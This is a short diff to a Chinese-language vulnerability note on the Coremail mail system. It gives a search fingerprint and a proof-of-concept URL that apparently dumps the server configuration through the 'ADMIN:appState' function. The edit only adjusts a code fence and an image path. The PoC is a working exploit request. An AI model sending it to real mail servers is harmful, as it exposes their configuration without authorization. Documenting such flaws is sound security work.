@@ -20,10 +20,8 @@ app="Coremail邮件系统"
 
 POC为
 
-```plain
+```
 http://xxx.xxx.xxx.xxx/mailsms/s?func=ADMIN:appState&dumpConfig=/
 ```
 
-![](images/202202101913188.png)
-
-
+![](../.gitbook/assets/202202101913188.png)
